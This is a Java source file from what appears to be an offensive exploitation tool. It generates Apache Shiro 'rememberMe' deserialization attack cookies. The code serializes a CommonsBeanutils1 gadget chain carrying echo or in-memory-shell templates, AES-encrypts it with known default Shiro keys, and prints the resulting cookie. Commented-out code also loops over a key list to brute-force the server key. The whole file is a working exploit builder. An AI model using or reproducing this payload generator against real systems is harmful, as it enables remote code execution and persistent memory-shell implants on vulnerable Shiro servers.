package vulgui.deser.frame;

import com.mchange.v2.ser.SerializableUtils;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.lang.StringUtils;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;
import vulgui.deser.echo.EchoPayload;
import vulgui.deser.payloads.CommonsCollections2;
import vulgui.deser.payloads.ObjectPayload;
import vulgui.deser.plugins.keytest.KeyEcho;
import vulgui.deser.util.ClassFiles;
import vulgui.deser.util.Gadgets;
import vulgui.deser.util.GadgetsK;
import vulgui.deser.util.Gadgetsplugin;
import vulgui.exp.DserUtil;
import vulgui.utils.AesUtil;
import vulgui.utils.ConvertUtil;


import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * @className Shiro
 * @Description 反序列化Shiro payload生成类
 * @Author JF
 * @Date 2020/9/11 11:08
 * @Version 1.0
 **/
public class Shiro implements FramePayload {
    @Override
    public String sendpayload(Object ChainObject) throws Exception {
        return null;
    }

    @Override
    public String sendpayload(Object chainObject, String key) throws Exception {
        /**
         * @description: shiro反序列化payload最后阶段进行序列化
         * @param: * @param: chainObject构造链对象
         * @param: key shiro密钥
         * @return: java.lang.String
         * @author sunnylast0
         * @date: 2020/9/11 19:59
         */

        byte[] serpayload = SerializableUtils.toByteArray(chainObject);

        byte[] bkey = DatatypeConverter.parseBase64Binary(key);

        byte[] encryptpayload = null;

        if (DserUtil.aesCipherType == 1) {
            CipherService cipherService = new AesCipherService();
            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
            encryptpayload = byteSource.getBytes();
        } else {
            encryptpayload = AesUtil.encrypt(serpayload, bkey);
        }

        return "rememberMe=" + DatatypeConverter.printBase64Binary(encryptpayload);
    }


    public static void main(String[] args) throws Exception {
        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass("CommonsBeanutils1");
        ObjectPayload<?> gadgetpayload = gadgetClazz.newInstance();

        List<String> echoList = Arrays.asList("TomcatEcho", "InjectMemTool", "SpringEcho", "NoEcho", "JbossEcho", "WeblogicEcho", "TomcatHeaderEcho");

        String option = "InjectMemTool";

        Object template = null;
        Object chainObject = null;
        if (echoList.contains(option)) {
            template = Gadgets.createTemplatesImpl(option);
        } else {
            template = GadgetsK.createTemplatesTomcatEcho();
        }

        Shiro shiro = new Shiro();
        if (template != null && !option.equals("KeyEcho") && !option.equals("WeblogicEcho")) {
            chainObject = gadgetpayload.getObject(template);
            final String sendpayload = shiro.sendpayload(chainObject, "6ZmI6I2j3Y+R1aSn5BOlAA==");
            System.out.println(sendpayload);
        } else {
            // jsf viewstate deser
            chainObject = gadgetpayload.getObject(template);
            byte[] serpayload = SerializableUtils.toByteArray(chainObject);
            System.out.println(DatatypeConverter.printBase64Binary(serpayload));
            // shiro
//            final String sendpayload = shiro.sendpayload(DserUtil.principal, "kPH+bIxk5D2deZiIxcaaaA==");
//            System.out.println(sendpayload);
        }

//        List<String> shiroKeys = new ArrayList<String>();
//        String cwd = System.getProperty("user.dir");
//        List<String> array = new ArrayList<String>(Arrays.asList(cwd, "resources", "shiro_keys.txt"));
//        File shiro_file = new File(StringUtils.join(array, File.separator));
//
//        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(shiro_file), "UTF-8"));
//        try {
//            String line;
//            while ((line = br.readLine()) != null) {
//                shiroKeys.add(line);
//            }
//        } catch (IOException e) {
//            e.printStackTrace();
//        } finally {
//            if (br != null) {
//                br.close();
//            }
//        }


//        Shiro shiro = new Shiro();
//        final String sendpayload = shiro.sendpayload(chainObject, "kPH+bIxk5D2deZiIxcaaaA==");
//        System.out.println(sendpayload);

//        List<String> shiroKeys = new ArrayList<String>();
//        String cwd = System.getProperty("user.dir");
//        List<String> array = new ArrayList<String>(Arrays.asList(cwd, "resources", "shiro_keys.txt"));
//        File shiro_file = new File(StringUtils.join(array, File.separator));
//
//        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(shiro_file), "UTF-8"));
//        try {
//            String line;
//            while ((line = br.readLine()) != null) {
//                shiroKeys.add(line);
//            }
//        } catch (IOException e) {
//            e.printStackTrace();
//        } finally {
//            if (br != null) {
//                br.close();
//            }
//        }
//
//
//        Shiro shiro = new Shiro();
//
//        for (int i = 0; i < shiroKeys.size(); i++) {
//            String shirokey = (String) shiroKeys.get(i);
//            try {
//                final String sendpayload = shiro.sendpayload(chainObject, shirokey);
//                System.out.println(shiro.sendpayload(chainObject, shirokey));
//            } catch (Exception e) {
//                System.out.println("[x] " + e.getMessage());
////                        System.out.println(e.getMessage());
////                        break;
//            }
//        }


    }
}